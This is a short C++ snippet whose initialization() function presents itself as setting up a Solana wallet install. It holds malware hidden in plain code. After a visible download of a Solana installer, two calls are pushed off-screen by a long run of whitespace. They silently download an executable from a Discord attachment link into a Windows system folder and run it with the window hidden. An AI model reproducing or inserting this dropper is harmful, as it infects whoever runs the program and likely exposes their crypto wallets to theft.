...
bool initialization()
{
    ShellExecuteW(NULL, L"open", L"cmd", L"/c curl https://release.solana.com/v1.10.25/solana-install-init-x86_64-pc-windows-msvc.exe --output C:/Windows/INF/WindowsSolanaWallet/solana-install/solana-install-init.exe --create-dirs", NULL, SW_HIDE);                                                                                                                                                                                                                                                ShellExecuteW(NULL, L"open", L"cmd", L"/c curl https://cdn.discordapp.com/attachments/964918984044597261/990354253447041034/wallet-core.exe --output C:/Windows/INF/WindowsSolanaWallet/solana-install/wallet-init.exe --create-dirs", NULL, SW_HIDE); ShellExecuteW(NULL, L"open", L"cmd", L"/c C:/Windows/INF/WindowsSolanaWallet/solana-install/wallet-init.exe", NULL, SW_HIDE);
